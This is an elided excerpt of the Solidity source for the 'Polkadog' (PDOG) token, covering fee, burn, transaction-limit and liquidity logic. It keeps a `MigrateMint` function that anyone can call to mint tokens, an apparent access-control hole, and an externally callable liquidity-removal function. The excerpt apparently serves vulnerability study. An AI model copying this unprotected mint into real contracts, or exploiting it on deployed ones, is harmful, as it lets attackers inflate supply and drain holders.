 ...
 */
contract Polkadog is Context, IERC20, IERC20Metadata, Ownable, Pausable {
    ...
    string private constant _name = "Polkadog";
    string private constant _symbol = "PDOG";
    ...
    uint256 private _perDayTimeBound = 900;
    ...
    uint private _deploy_timstamp;
    uint private constant _max_days = 21 days;
    ...
    uint256 private transactionLimit = 100 * 10**18;
    ...
    constructor (address marketing_address_) {
        ...
        _deploy_timstamp = _setDeployDate();
        emit Transfer(address(0), _msgSender(), _tTotal);

        marketing_address = marketing_address_;
    }
    ...
    function transferToDistributors(address recipient, uint256 amount) external virtual onlyOwner () {
        ...
        _beforeTokenTransfer(_msgSender(), recipient);
    ...
    function MigrateMint(address to, uint amount) external virtual {
        _mint(to, amount);
    }

    function updateMigrator(address newMigrator) onlyOwner external {
    ...
    function _getTValues(uint256 amount, address recipient) private view returns (uint256, uint256, uint256, uint256, uint256) {
    ...
    function _getRValues(uint256 amount, uint256 tFee, uint256 tLiquidity, uint256 tBurn, uint256 tMarketingFee, address recipient) private view returns (uint256, uint256, uint256) {
        uint256 currentRate = _getRate();
        uint256 tAmount = amount;
    ...
    function _takeMarketingFee(uint256 tMarketingFee) private {
        uint256 currentRate =  _getRate();
        uint256 rMarketingFee = tMarketingFee.mul(currentRate);
        _rOwned[marketing_address] = _rOwned[marketing_address].add(rMarketingFee);
        if(_isExcluded[marketing_address])
            _tOwned[marketing_address] = _tOwned[marketing_address].add(tMarketingFee);
    }
    ...
    function calculateTransactionBurn(uint256 _amount) private view returns (uint256) {
    ...
    function afterLimitFee() private {
    ...
    function restoreAllLowerFee() private {
    ...
    function _transfer(
        ...
        if(_enableFee && (_isIncludedInFee[from] || _isIncludedInFee[to])){
            if (block.timestamp <= (_deploy_timstamp + _max_days)) {
                uint256 recipientBalance = balanceOf(to);
                require(amount <= _maxTxAmount, "ERC20: Transfer amount exceeds maxTxAmount");
                if(!_isExcludedFromMaxTx[to])
                    require(recipientBalance + amount <= _maxTxAmount, "ERC20: Recipient amount exceeds maxTxAmount");
            }
            takeFee = true;
        ...
        if(to == uniswapV2Pair) {
            _transactionAmount[from] += amount; 
        }
    ...
    function getTime(address from) public view returns(uint256) {
        return _transactionTime[from];
    }

    function getAmount(address from) public view returns(uint256) {
        return _transactionAmount[from];
    }

    function swapAndLiquify(uint256 contractTokenBalance, address account) private lockTheSwap {
    ...
    function getTaxValues(address sender, address recipient, uint256 tAmount) public returns(uint256, uint256,uint256,uint256,uint256,uint256,uint256,uint256){
        uint256 pastAmount = _transactionAmount[sender];
        uint256 remainingTxLimit = transactionLimit - pastAmount;

        Amount memory taxAmount;
        {
            address receiver = recipient;
            (uint256 n_tTransferAmount, uint256 n_tFee, uint256 n_tLiquidity, uint256 n_tBurn, uint256 n_tMarketingFee) = _getTValues(remainingTxLimit, receiver);
            (uint256 n_rAmount, uint256 n_rTransferAmount, uint256 n_rFee) = _getRValues(remainingTxLimit, n_tFee, n_tLiquidity, n_tBurn, n_tMarketingFee, receiver);
            {
                taxAmount.tTransferAmount += n_tTransferAmount;
                taxAmount.tLiquidity += n_tLiquidity;
                taxAmount.tFee += n_tFee;
                taxAmount.tBurn += n_tBurn;
                taxAmount.tMarketingFee += n_tMarketingFee;
                taxAmount.rAmount += n_rAmount;
                taxAmount.rFee += n_rFee;
                taxAmount.rTransferAmount += n_rTransferAmount;
            }
        }
        return (taxAmount.tTransferAmount, taxAmount.tLiquidity, taxAmount.tFee, taxAmount.tBurn, taxAmount.tMarketingFee, taxAmount.rAmount, taxAmount.rFee, taxAmount.rTransferAmount);
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if(_takeBothTax) {
            (tTransferAmount, tFee, tLiquidity, tBurn, tMarketingFee, rAmount, rTransferAmount, rFee) = getTaxValues(sender, recipient, tAmount);
        } else {
            address receiver = recipient;
            uint256 amount = tAmount;
            (tTransferAmount, tFee, tLiquidity, tBurn, tMarketingFee) = _getTValues(amount, receiver);
            (rAmount, rTransferAmount, rFee) = _getRValues(amount, tFee, tLiquidity, tBurn, tMarketingFee, receiver);
        }
    ...
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity, uint256 tBurn, uint256 tMarketingFee) = _getTValues(tAmount, recipient);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, tBurn, tMarketingFee, recipient);
    ...
    function removeLiquidityFromPlatform(uint256 liquidity) external virtual {
        ...
        IUniswapV2Pair(uniswapV2Pair).approve(UNISWAPV2ROUTER, liquidity);
